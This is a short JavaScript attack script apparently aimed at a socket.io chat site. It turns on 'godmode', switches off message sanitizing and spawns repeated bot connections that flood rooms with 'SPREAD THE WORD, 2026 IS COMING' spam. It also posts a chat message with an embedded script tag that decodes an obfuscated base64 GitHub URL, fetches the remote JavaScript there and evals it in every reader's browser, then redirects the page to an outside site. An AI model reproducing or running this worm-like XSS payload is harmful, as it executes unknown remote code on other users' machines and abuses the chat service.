setTimeout(() => {
socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
    });
    socketb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
        room: Math.floor(50+(Math.floor(Math.random()*2)*1967))
    });
    socketb.emit("command", {
        list: ["color"]
    });
    socketb.emit('command', { list: ['godmode'] });
    socketb.emit('command', { list: ['pope'] });
    setInterval(() => {
    socketb.emit("talk", {
        text: "SPREAD THE WORD, THE 2026 IS COMING."
    });
    },500)
}, 500)
setInterval(() => {
socket.emit("talk", {
    text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'R2026S'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
});
},500)
socket.emit('command',{
  list: ['name', $("#login_name").val() + ' #RAS2026']
})
// Redirects the user after 5 seconds (5000 milliseconds)
setTimeout(function() {
  window.location.href = 'https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/';
}, 1000);
}, 3000);
